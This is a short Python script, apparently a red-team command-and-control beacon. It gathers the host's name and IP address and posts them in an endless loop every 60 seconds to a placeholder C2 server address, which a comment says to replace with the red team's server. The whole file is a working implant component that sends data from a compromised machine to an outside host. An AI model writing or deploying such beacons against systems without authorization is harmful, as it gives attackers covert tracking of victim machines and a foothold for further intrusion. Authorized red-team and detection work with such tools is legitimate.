import requests
import time
import socket

# Configuration
C2_URL = 'x.x.x.x/beacon'#Change to the redteams server you want to beacon back to.
INTERVAL = 60  # Beacon interval in seconds

def get_system_info():
    return {
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname())
    }

def beacon():
    while True:
        system_info = get_system_info()
        try:
            response = requests.post(C2_URL, json=system_info)
            if response.status_code == 200:
                print("Beacon sent successfully.")
            else:
                print(f"Failed to send beacon. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending beacon: {e}")
        
        time.sleep(INTERVAL)

if __name__ == "__main__":
    beacon()
